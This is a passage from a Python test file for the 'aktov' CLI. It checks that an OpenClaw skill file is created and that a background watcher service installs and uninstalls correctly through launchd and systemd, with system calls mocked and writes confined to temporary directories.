        """aktov init openclaw creates SKILL.md in correct location."""
        from unittest.mock import patch

        from aktov.cli.main import _init_openclaw

        with tempfile.TemporaryDirectory() as tmpdir:
            with patch.object(Path, "home", return_value=Path(tmpdir)):
                _init_openclaw()

            skill_file = (
                Path(tmpdir) / ".openclaw" / "workspace" / "skills" / "aktov-guard" / "SKILL.md"
            )
            assert skill_file.exists()
            content = skill_file.read_text()
            assert "aktov-guard" in content
            assert "python3 -m aktov.hooks.openclaw" in content
            assert "requires:" in content

    def test_init_openclaw_idempotent(self, capsys: pytest.CaptureFixture) -> None:
        """Running aktov init openclaw twice doesn't overwrite."""
        from aktov.cli.main import _init_openclaw

        with tempfile.TemporaryDirectory() as tmpdir:
            with patch.object(Path, "home", return_value=Path(tmpdir)):
                _init_openclaw()
                _init_openclaw()  # second call

            captured = capsys.readouterr()
            assert "already installed" in captured.out


# ---------------------------------------------------------------------------
# Watcher service install tests
# ---------------------------------------------------------------------------

class TestWatcherInstall:
    """Tests for aktov watch --install / --uninstall / --status."""

    def test_install_launchd_creates_plist(self) -> None:
        """_install_launchd writes a plist with correct content."""
        from aktov.hooks.openclaw import _LAUNCHD_LABEL, _install_launchd

        with tempfile.TemporaryDirectory() as tmpdir:
            fake_home = Path(tmpdir)
            plist_dir = fake_home / "Library" / "LaunchAgents"
            plist_file = plist_dir / f"{_LAUNCHD_LABEL}.plist"

            aktov_bin = "/usr/local/bin/aktov"
            with (
                patch.object(Path, "home", return_value=fake_home),
                patch("aktov.hooks.openclaw.subprocess.run"),
                patch("aktov.hooks.openclaw._get_aktov_executable", return_value=aktov_bin),
            ):
                _install_launchd(interval=0.5)

            assert plist_file.exists()
            content = plist_file.read_text()
            assert "<string>io.aktov.watch</string>" in content
            assert f"<string>{aktov_bin}</string>" in content
            assert "<key>RunAtLoad</key>" in content
            assert "<key>KeepAlive</key>" in content
            assert "<string>0.5</string>" in content

            # Log dir created
            assert (fake_home / ".aktov" / "logs").is_dir()

    def test_install_launchd_idempotent(self, capsys: pytest.CaptureFixture) -> None:
        """Second install prints 'already installed' and returns."""
        from aktov.hooks.openclaw import _LAUNCHD_LABEL, _install_launchd

        with tempfile.TemporaryDirectory() as tmpdir:
            fake_home = Path(tmpdir)
            plist_dir = fake_home / "Library" / "LaunchAgents"
            plist_dir.mkdir(parents=True)
            plist_file = plist_dir / f"{_LAUNCHD_LABEL}.plist"
            plist_file.write_text("<plist>existing</plist>")

            with (
                patch.object(Path, "home", return_value=fake_home),
                patch("aktov.hooks.openclaw.subprocess.run") as mock_run,
            ):
                _install_launchd(interval=0.5)

            captured = capsys.readouterr()
            assert "Already installed" in captured.err
            # Should not have called launchctl
            mock_run.assert_not_called()

    def test_install_systemd_creates_unit(self) -> None:
        """_install_systemd writes a unit file with correct content."""
        from aktov.hooks.openclaw import _SYSTEMD_UNIT, _install_systemd

        with tempfile.TemporaryDirectory() as tmpdir:
            fake_home = Path(tmpdir)
            unit_dir = fake_home / ".config" / "systemd" / "user"
            unit_file = unit_dir / _SYSTEMD_UNIT

            aktov_bin = "/usr/local/bin/aktov"
            with (
                patch.object(Path, "home", return_value=fake_home),
                patch("aktov.hooks.openclaw.subprocess.run") as mock_run,
                patch("aktov.hooks.openclaw._get_aktov_executable", return_value=aktov_bin),
            ):
                _install_systemd(interval=1.0)

            assert unit_file.exists()
            content = unit_file.read_text()
            assert f"ExecStart={aktov_bin} watch --interval 1.0" in content
            assert "Restart=on-failure" in content
            assert "WantedBy=default.target" in content

            # Should have called daemon-reload and enable
            assert mock_run.call_count == 2

    def test_uninstall_launchd_removes_plist(self) -> None:
        """_uninstall_launchd removes plist and calls launchctl unload."""
        from aktov.hooks.openclaw import _LAUNCHD_LABEL, _uninstall_launchd

        with tempfile.TemporaryDirectory() as tmpdir:
            fake_home = Path(tmpdir)
            plist_dir = fake_home / "Library" / "LaunchAgents"
            plist_dir.mkdir(parents=True)
            plist_file = plist_dir / f"{_LAUNCHD_LABEL}.plist"
            plist_file.write_text("<plist>content</plist>")

            with (
                patch.object(Path, "home", return_value=fake_home),
                patch("aktov.hooks.openclaw.subprocess.run") as mock_run,
            ):
                _uninstall_launchd()

            assert not plist_file.exists()
            mock_run.assert_called_once()
            assert "unload" in mock_run.call_args[0][0]

    def test_uninstall_systemd_removes_unit(self) -> None:
        """_uninstall_systemd removes unit file and disables service."""
        from aktov.hooks.openclaw import _SYSTEMD_UNIT, _uninstall_systemd

        with tempfile.TemporaryDirectory() as tmpdir:
            fake_home = Path(tmpdir)
            unit_dir = fake_home / ".config" / "systemd" / "user"
            unit_dir.mkdir(parents=True)
            unit_file = unit_dir / _SYSTEMD_UNIT
            unit_file.write_text("[Unit]\n")

            with (
                patch.object(Path, "home", return_value=fake_home),
                patch("aktov.hooks.openclaw.subprocess.run") as mock_run,
            ):
                _uninstall_systemd()

            assert not unit_file.exists()
            # disable --now + daemon-reload
            assert mock_run.call_count == 2

    def test_install_unsupported_platform(self, capsys: pytest.CaptureFixture) -> None:
        """Unsupported platform prints helpful error."""
        from aktov.hooks.openclaw import install_watcher

        with patch("aktov.hooks.openclaw.platform.system", return_value="Windows"):
            install_watcher()

        captured = capsys.readouterr()
        assert "Unsupported platform" in captured.err
        assert "Manual setup" in captured.err

    def test_install_dispatcher_darwin(self) -> None:
        """install_watcher dispatches to _install_launchd on Darwin."""
        from aktov.hooks.openclaw import install_watcher

        with (
            patch("aktov.hooks.openclaw.platform.system", return_value="Darwin"),
            patch("aktov.hooks.openclaw._install_launchd") as mock_launchd,
        ):
            install_watcher(interval=2.0)

        mock_launchd.assert_called_once_with(2.0)

    def test_install_dispatcher_linux(self) -> None:
        """install_watcher dispatches to _install_systemd on Linux."""
        from aktov.hooks.openclaw import install_watcher

        with (
            patch("aktov.hooks.openclaw.platform.system", return_value="Linux"),
            patch("aktov.hooks.openclaw._install_systemd") as mock_systemd,
        ):
            install_watcher(interval=1.5)

        mock_systemd.assert_called_once_with(1.5)

    def test_cli_watch_install_flag(self) -> None:
        """aktov watch --install dispatches to install_watcher."""
        from aktov.cli.main import main

        with patch("aktov.hooks.openclaw.install_watcher") as mock_install:
            main(["watch", "--install"])

        mock_install.assert_called_once_with(interval=0.5)

    def test_cli_watch_uninstall_flag(self) -> None:
        """aktov watch --uninstall dispatches to uninstall_watcher."""
        from aktov.cli.main import main

        with patch("aktov.hooks.openclaw.uninstall_watcher") as mock_uninstall:
            main(["watch", "--uninstall"])

        mock_uninstall.assert_called_once()

    def test_cli_watch_status_flag(self) -> None:
        """aktov watch --status dispatches to status_watcher."""
        from aktov.cli.main import main

        with patch("aktov.hooks.openclaw.status_watcher") as mock_status:
            main(["watch", "--status"])

        mock_status.assert_called_once()
